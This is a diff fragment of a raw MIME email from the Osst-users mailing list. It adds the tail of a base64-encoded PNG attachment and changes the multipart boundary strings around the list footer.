+0XZIapfnX0aepE4FgwlgTG4PAsuqllisFHXDvVO9MnJReVA5w7Jg+VdR/9zGHjQAPWsdu9P4
+hBbAWBJMbFznuQEh6MmDqoEQG5UCz/p1BtpMmApCiIOEDa/LRf4NeqDJk3EYPGKMzfvwrJYv
+eC5ofKhRuyDrwb15xBjtEbHdS7Ug1A0bq0h9chLqExIggYQFOSfBso22yEF8mKhiFj1WsyxR
+khmg9nqA1BOMfUKtX+LlPLZfDU0umvjqvkIEdPDMqoytyPAEvuJG/VSwEogV3wck6zEZt63C
+Pu7jtTg8vgp66mewRVA97qFCkycLHYfDj2f46QK7R5vr7vYgJHX0Qlsqic3jU49bE6T00qzD
+Ud0f/pAxjmqZQji8Xx6q69RuBVYs0BlcgQkxgSvNYZk6V2r2aT88pCLxtOblNjA9lCqF9HNU
+UYdooPq5Xc6nX5Ad3eEND0+UiZo0hsZ6/bHrkGBoMEbGUxmh1KuHFsborZ+ujVCQpYODBf8A
+eT7K1GOX57bYXe58T/GdaZiUbkJSST113OT1N6PJFDx8tvQe7x3Wn2v8VoYmlrSqEOe3F/xY
+hsfC//SbS6hR+9Zj9C3VFsuUXugjCJU+aZpvOzz2USnoh911nWXx5K92ppduGklQKsE/KNH+
+iGwjHvvw8sgMlZ6gCzLfuDbitQ/5MRGAqz8OLFnyMCr59KLsw1If7i4wVK7HsI8WKP9h+l6N
+MibyKyY0ch1wWTXJRnDfbd9855GjWqwJupCJ82gjOtrIPsREzzwYhtDPgoCPoKjoS0EvPGom
+cXZbWLIy8LeBwin9YIAB/iP8BsI+Ib2iUjuQAAAAAElFTkSuQmCC
+
+------=_NextPart_000_0012_B832FB0F.18BBDA23--
 
 
---===============3945097398082083961==
+
+--===============7836243808589605187==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
 Content-Disposition: inline
 
 
---===============3945097398082083961==
+--===============7836243808589605187==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -243,5 +307,6 @@ Osst-users mailing list
 Osst-users@lists.sourceforge.net
 https://lists.sourceforge.net/lists/listinfo/osst-users
 
---===============3945097398082083961==--
+--===============7836243808589605187==--
+
 
